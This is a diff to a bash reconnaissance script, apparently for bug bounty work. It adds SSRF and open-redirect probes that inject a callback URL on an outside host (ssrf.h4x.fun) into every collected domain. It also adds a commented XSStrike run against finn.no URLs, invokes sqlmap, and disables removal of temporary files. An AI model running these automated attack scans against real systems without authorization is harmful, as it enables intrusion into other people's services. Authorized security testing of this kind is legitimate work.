@@ -470,26 +470,42 @@ wait
 # check "Remove date folder"
 
 ##############Request Smuggling check#######################
-
+# Todo implement - is easy
 
 ########################################
 
+#################XSStrike####################################
+# python xsstrike.py --seeds /var/www/h4x.fun/reports/finn.no/2020-05-27/recon-2020-05-27/wayback-data/waybackurls_clean.txt --file-log-level INFO --log-file output.txt --skip
+# TODO implement
+########################################
+
 #########Check for Open Redirects or SSRFs#################
+# TODO Check with gf & gf-patterns
 # echo all domains
 # run against ssrf_OR_Identifier.sh
+print "SSRF / OR script"
 cat "$LOGDIR/domains.txt" >> "$TMPDIR/all_domains.txt"
 cat "$LOGDIR/recon-$todate/alldomains.txt" >> "$TMPDIR/all_domains.txt"
 cat "$TMPDIR/all_domains.txt" | sort | uniq >> "$LOGDIR/all_domains.txt"
 mkdir -p $LOGDIR/ssrf
 
+# check using script from Twitter
 for entry in $(cat "$LOGDIR/all_domains.txt"); do
     $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$LOGDIR/ssrf" "$TMPDIR"
     check "SSRF / OR identifier for $entry"
 done
+
+# Check using SSRFire
+# Run against domain
+print "SSRFire"
+mkdir -p $LOGDIR/ssrf/ssrfire
+$TOOLDIR/SSRFire/ssrfire.sh -d "$domain" -s "http://ssrf.h4x.fun/x/pqCLV?$domain" >> "$LOGDIR/ssrf/ssrfire/log.txt"
+check "SSRFire"
+cp -r $TOOLDIR/SSRFire/output/$domain $LOGDIR/ssrf/ssrfire
+check "Copy results ssrfire"
+
 ##############SQLi Check####################################
 # TODO add tamperscripts
-# Clean up parameters
-
 
 print "Make dir and run sqlmap"
 mkdir -p $LOGDIR/sqlmap/
@@ -507,6 +523,7 @@ check "Sqlmap"
 # check "LazyRecon"
 
 print "Remove temporary dir"
-rm -rf "$TMPDIR"
+# TODO Re-enable
+# rm -rf "$TMPDIR"
 check "remove temporary dir"
 
